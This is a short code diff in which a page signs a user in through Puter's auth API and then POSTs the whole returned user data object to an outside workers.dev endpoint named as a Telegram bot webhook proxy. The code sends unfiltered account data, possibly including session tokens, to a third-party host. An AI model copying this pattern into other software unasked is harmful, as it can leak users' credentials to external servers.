@@ -6,7 +6,13 @@
             try{
                 let userData = await puter.auth.signIn({"attempt_temp_user_creation":true});
                 puter.print('Signed in:<br>' + JSON.stringify(userData)+'<br><br>');
-                window.postPuterUserDataToWebhook(userData);
+                await fetch('https://puter-telegram-bot-webhook-proxy.utsavmadaan823.workers.dev/webhook', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(userData)
+                });
             }catch(error){
                 puter.print("Error: "+error.message+'<br><br>');
             }
